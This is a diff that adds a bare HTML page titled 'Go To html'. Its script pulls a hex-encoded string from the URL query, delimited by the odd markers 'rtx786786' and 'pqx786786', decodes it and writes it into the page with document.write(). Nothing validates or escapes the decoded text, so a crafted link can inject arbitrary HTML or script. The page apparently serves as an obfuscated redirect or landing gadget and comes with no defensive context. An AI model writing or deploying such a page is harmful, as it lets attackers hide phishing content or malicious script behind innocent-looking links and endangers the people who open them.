@@ -1,0 +1,56 @@
+    <!doctype html>
+    <html>
+    <head>
+
+	    
+    <title>Go To html</title>
+    </head>
+    <body>
+
+
+
+
+
+<script>
+
+
+	
+function fromHex(h) {
+    var s = ''
+    for (var i = 0; i < h.length; i+=2) {
+        s += String.fromCharCode(parseInt(h.substr(i, 2), 16))
+    }
+    return decodeURIComponent(escape(s))
+}
+	
+  const queryString = window.location.search;
+ var i_start=queryString.indexOf("rtx786786");
+var i_end=0;
+var q_start="";
+	var hex_url="";
+	
+ if(i_start >=0){
+  q_start = queryString.substr(i_start+9);
+	 i_end=q_start.indexOf("pqx786786");
+ }
+ if(i_end >= 9 && q_start.length > 11){
+hex_url = q_start.substr(0 ,i_end);
+ }
+	
+
+ var url="";
+	 if(hex_url.length > 8){
+		//   alert(hex_url);
+	url = fromHex(hex_url);
+	 }
+	
+ if(url.length > 2)
+ {
+//url avil
+document.write(url);
+  }
+
+  </script>
+  
+    </body>
+    </html>
